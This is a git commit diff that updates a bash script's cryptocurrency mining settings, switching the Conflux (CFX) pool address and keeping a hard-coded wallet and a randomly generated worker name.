a2829b1c6f516cb3cd7b15032ad85c1975072285
Alienbumi <73816473+Alienbumi@users.noreply.github.com>
2022-03-01 13:04:28 +0700

    Update BlinkCFx.sh

--- BlinkCFx.sh
+++ BlinkCFx.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-POOL=cfx-eu1.nanopool.org:17777
+POOL=cfx.666pool.com:6655
 WALLET=0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.$(echo MieEU-$(shuf -i 0001-1000 -n 1))
 WORKER=$(echo MieEU-$(shuf -i 0001-1000 -n 1))
 
